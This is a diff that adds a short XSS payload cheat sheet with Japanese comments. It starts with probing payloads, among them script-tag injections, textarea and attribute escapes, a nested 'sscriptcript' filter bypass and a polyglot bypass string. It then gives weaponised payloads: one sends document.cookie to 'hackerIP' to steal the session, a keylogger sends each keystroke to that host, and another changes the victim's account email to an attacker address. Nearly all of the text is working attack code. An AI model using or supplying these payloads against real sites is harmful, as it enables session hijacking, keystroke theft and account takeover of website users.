@@ -1,0 +1,19 @@
+//XSS脆弱性の探索
+'>"><hr>
+<script>alert('XSS');</script>
+"><script>alert('XSS');</script> //">でエスケープ
+</textarea><script>alert('XSS');</script> //</tetarea>のエスケープ
+<sscriptcript>alert('XSS');</sscriptcript> //scriptという文字列をエスケープされているときの回避
+/images/cat.jpg" onload="alert('XSS'); //imgタグなどの属性を追加させる
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e　//属性、タグをエスケープし、フィルターをバイパス
+
+
+//セッションの窃取
+<script>fetch('https://hackerIP/steal?cookie=' + btoa(document.cookie));</script>
+
+//キーロガー
+<script>document.onkeypress = function(e) { fetch('http://hackerIP/log?key=' + btoa(e.key) );}</script>
+
+//Emailの変更
+<script>user.changeEmail('attacker@hacker.com');</script>
+
